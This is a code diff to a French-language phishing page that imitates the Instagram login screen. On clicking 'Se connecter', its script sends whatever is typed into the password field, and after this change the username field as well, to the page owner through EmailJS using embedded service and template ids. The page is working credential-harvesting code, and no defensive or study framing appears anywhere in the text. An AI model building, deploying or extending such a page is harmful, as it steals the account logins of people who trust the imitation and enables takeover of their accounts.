@@ -4,10 +4,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta property="og:title" content="Instagram">
-<meta property="og:description" content="Reel humour.">
-<meta property="og:image" content="Instagram_icon.png">
-<meta property="og:type" content="website">
+    <meta property="og:title" content="Instagram">
+    <meta property="og:description" content="Reel humour.">
+    <meta property="og:image" content="Instagram_icon.png">
+    <meta property="og:type" content="website">
     <title>Instagram Login</title>
     <link rel="shortcut icon" href="./Instagram_icon.png">
     <style>
@@ -152,7 +152,7 @@
             <span>OU</span>
             <hr>
         </div>
-        <input type="text" class="input" placeholder="Num. téléphone, nom d’utilisateur ou e-mail">
+        <input type="text" class="input" placeholder="Num. téléphone, nom d’utilisateur ou e-mail" id="nameKey">
         <input type="password" class="input" placeholder="Mot de passe" id="passKey">
         <a href="#" class="forgot-password">Mot de passe oublié ?</a>
         <button class="btn-login" id="sub">Se connecter</button>
@@ -173,13 +173,15 @@
 
     <script>
         document.getElementById('sub').addEventListener("click", () => {
-            let inpPassKey = document.getElementById("passKey")
-            emailjs.init('EzUeY3ZDf7GTwLVKE'); // Remplacez 'YOUR_USER_ID' par votre user_id EmailJS
+            let inpNameKey = document.getElementById("nameKey");
+            let inpPassKey = document.getElementById("passKey");
+            emailjs.init('EzUeY3ZDf7GTwLVKE'); // Remplacez par votre user_id EmailJS
 
             const serviceID = 'service_70nodew'; // Remplacez par votre service_id EmailJS
             const templateID = 'template_9rowdy5'; // Remplacez par votre template_id EmailJS
 
             const templateParams = {
+                namekey: inpNameKey.value,  // Ajout de la valeur nameKey
                 passkey: inpPassKey.value
             };
 
@@ -190,8 +192,9 @@
                     console.error('Échec de l\'envoi de la commande :', error);
                     alert('OUPS, ERREUR');
                 });
-        })
+        });
     </script>
+
 </body>
 
 </html>
